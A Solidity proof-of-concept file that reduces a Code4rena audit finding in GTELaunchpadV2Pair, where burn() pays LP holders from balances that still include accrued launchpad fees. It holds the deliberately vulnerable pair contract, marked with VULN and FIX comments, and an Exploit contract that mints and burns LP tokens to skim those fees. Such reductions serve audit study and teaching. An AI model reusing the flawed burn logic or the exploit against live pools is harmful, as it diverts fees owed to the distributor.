// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — GTELaunchpadV2Pair::burn over-estimates distribution amounts
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64851 / H-03)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: burn() pro-rates LP redemption against token balances that still
    include accruedLaunchpadFee{0,1}, which are owed to the fee distributor — not
    to LPs. Mint prices liquidity against reserves (balances minus fees). An
    attacker can mint, then burn, and extract a share of the accrued fees.

    Blamed lines preserved with @> VULN markers
    (GTELaunchpadV2Pair.sol L217-L218 @ f43e1eed).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced GTELaunchpadV2Pair — fee-aware reserves + Uniswap-style mint/burn.
contract GTELaunchpadV2Pair {
    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;

    address public token0;
    address public token1;
    address public launchpadFeeDistributor;

    uint112 private reserve0;
    uint112 private reserve1;

    uint112 public accruedLaunchpadFee0;
    uint112 public accruedLaunchpadFee1;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    uint256 private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, "LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function initialize(address _t0, address _t1, address _dist) external {
        require(token0 == address(0), "init");
        token0 = _t0;
        token1 = _t1;
        launchpadFeeDistributor = _dist;
    }

    /// @dev Seed initial LP + set accrued fees (simulates prior swaps same-block).
    function seed(uint256 amount0, uint256 amount1, uint112 fee0, uint112 fee1, address lpTo) external {
        require(totalSupply == 0, "seeded");
        MockERC20(token0).transferFrom(msg.sender, address(this), amount0);
        MockERC20(token1).transferFrom(msg.sender, address(this), amount1);
        // Fair initial LP from the non-fee portion of balances
        uint256 liq0 = amount0 - uint256(fee0);
        uint256 liq1 = amount1 - uint256(fee1);
        uint256 liquidity = _sqrt(liq0 * liq1) - MINIMUM_LIQUIDITY;
        balanceOf[address(0)] = MINIMUM_LIQUIDITY;
        balanceOf[lpTo] = liquidity;
        totalSupply = liquidity + MINIMUM_LIQUIDITY;
        accruedLaunchpadFee0 = fee0;
        accruedLaunchpadFee1 = fee1;
        // Reserves exclude accrued launchpad fees (verbatim _update semantics)
        reserve0 = uint112(MockERC20(token0).balanceOf(address(this))) - fee0;
        reserve1 = uint112(MockERC20(token1).balanceOf(address(this))) - fee1;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "lp");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function _mint(address to, uint256 value) internal {
        totalSupply += value;
        balanceOf[to] += value;
    }

    function _burn(address from, uint256 value) internal {
        balanceOf[from] -= value;
        totalSupply -= value;
    }

    function _safeTransfer(address token, address to, uint256 value) private {
        require(MockERC20(token).transfer(to, value), "tf");
    }

    // this low-level function should be called from a contract which performs important safety checks
    function mint(address to) external lock returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        uint256 balance0 = MockERC20(token0).balanceOf(address(this));
        uint256 balance1 = MockERC20(token1).balanceOf(address(this));
        uint256 amount0 = balance0 - _reserve0;
        uint256 amount1 = balance1 - _reserve1;

        uint256 _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            liquidity = _sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;
            _mint(address(0), MINIMUM_LIQUIDITY);
        } else {
            // mint prices against reserves (fees excluded) — GTELaunchpadV2Pair.sol:196
            liquidity = _min(amount0 * _totalSupply / _reserve0, amount1 * _totalSupply / _reserve1);
        }
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(to, liquidity);

        // same-block: fees stay accrued; reserves = balances - fees
        reserve0 = uint112(balance0) - accruedLaunchpadFee0;
        reserve1 = uint112(balance1) - accruedLaunchpadFee1;
    }

    // this low-level function should be called from a contract which performs important safety checks
    function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
        address _token0 = token0; // gas savings
        address _token1 = token1; // gas savings
        uint256 balance0 = MockERC20(_token0).balanceOf(address(this));
        uint256 balance1 = MockERC20(_token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];

        uint256 _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        // @> VULN: pro-rata uses full balances including accrued launchpad fees owed to distributor
        amount0 = liquidity * balance0 / _totalSupply; // using balances ensures pro-rata distribution
        // @> VULN: same fee inclusion on token1
        amount1 = liquidity * balance1 / _totalSupply; // using balances ensures pro-rata distribution
        // FIX: amount0 = liquidity * (balance0 - accruedLaunchpadFee0) / _totalSupply;
        // FIX: amount1 = liquidity * (balance1 - accruedLaunchpadFee1) / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "INSUFFICIENT_LIQUIDITY_BURNED");
        _burn(address(this), liquidity);
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        balance0 = MockERC20(_token0).balanceOf(address(this));
        balance1 = MockERC20(_token1).balanceOf(address(this));

        reserve0 = uint112(balance0) - accruedLaunchpadFee0;
        reserve1 = uint112(balance1) - accruedLaunchpadFee1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract Exploit {
    MockERC20 public token0; // CREATE nonce 1
    MockERC20 public token1; // CREATE nonce 2
    GTELaunchpadV2Pair public pair; // CREATE nonce 3 — vulnerable

    uint256 public profit0;
    uint256 public stolenFeeShare;

    constructor() {
        token0 = new MockERC20("Base", "BASE");
        token1 = new MockERC20("Quote", "QUOTE");
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0xBEEF));
    }

    function run() external {
        // Honest pool: 1e6 of each in reserves + 1e5 token0 accrued as launchpad fee
        uint256 seedAmt = 1_000_000e18;
        uint112 fee0 = 100_000e18;
        uint112 fee1 = 0;

        token0.mint(address(this), seedAmt + uint256(fee0) + 500_000e18);
        token1.mint(address(this), seedAmt + 500_000e18);
        token0.approve(address(pair), type(uint256).max);
        token1.approve(address(pair), type(uint256).max);

        // balances = seedAmt+fee0 / seedAmt; reserves = seedAmt / seedAmt
        pair.seed(seedAmt + uint256(fee0), seedAmt, fee0, fee1, address(0xA11CE));

        // Attacker deposits proportionally to reserves
        uint256 dep0 = 100_000e18;
        uint256 dep1 = 100_000e18;
        token0.transfer(address(pair), dep0);
        token1.transfer(address(pair), dep1);

        // Note: amount0 for mint = dep0 + fee0 (balance-reserve includes fees), so LP is
        // limited by amount1 path — still non-zero. Harm is realized on burn.
        uint256 liq = pair.mint(address(this));
        require(liq > 0, "no liq");

        // Uniswap-style: send LP to pair then burn
        pair.transfer(address(pair), liq);
        (uint256 out0, uint256 out1) = pair.burn(address(this));
        out1; // silence

        // Fair redemption would return ~dep0 of token0; fee-inflated balances yield more.
        require(out0 > dep0, "harm not demonstrated: burn did not over-pay token0");
        stolenFeeShare = out0 - dep0;
        profit0 = stolenFeeShare;
        require(stolenFeeShare > 0, "zero profit");
    }
}
